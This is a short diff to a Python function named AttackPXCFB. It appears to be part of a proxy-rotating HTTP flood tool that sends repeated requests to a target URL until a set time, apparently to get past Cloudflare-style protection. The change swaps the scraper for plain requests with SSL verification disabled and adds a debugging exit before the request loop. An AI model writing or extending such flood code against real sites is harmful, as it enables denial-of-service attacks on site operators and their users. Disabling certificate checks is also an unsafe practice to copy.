@@ -569,9 +569,9 @@ def AttackPXCFB(url, until_datetime, scraper):
                 'https': proxy_url,
 
                 }
-           
-                response = scraper.get(url, proxies=proxies)
-                print(response.status_code,proxy_url)
+                response = requests.get(url, headers=headers, proxies=proxies, verify=False)  # disable SSL verification to debug
+                print(response.status_code, proxy_url)
+
                 exit()
                 for _ in range(50):
                     response = scraper.get(url,headers=headers, proxies=proxies)
